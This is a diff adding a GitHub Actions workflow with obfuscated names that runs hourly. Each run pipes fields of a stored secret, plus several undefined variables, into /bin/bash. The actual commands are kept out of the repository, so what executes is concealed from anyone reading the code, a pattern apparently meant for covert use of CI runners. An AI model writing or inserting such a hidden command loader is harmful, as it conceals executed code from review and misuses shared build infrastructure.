@@ -1,0 +1,24 @@
+name: jiumoshi1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiumoshi1987
+        env:
+          jqxlh72179: ${{ secrets.jqxlh72179 }}
+        run: |
+          echo $jqxlh72179 | jq -r .pk61232 | /bin/bash
+          echo $qxady703 | jq -r .j274 | /bin/bash
+          echo $lq7076 | jq -r .a955 | /bin/bash
+          echo $tw121 | jq -r .pn42182 | /bin/bash
+          echo $uj2245 | jq -r .io12534 | /bin/bash
+          echo $xnqkb91 | jq -r .yn918 | /bin/bash
+
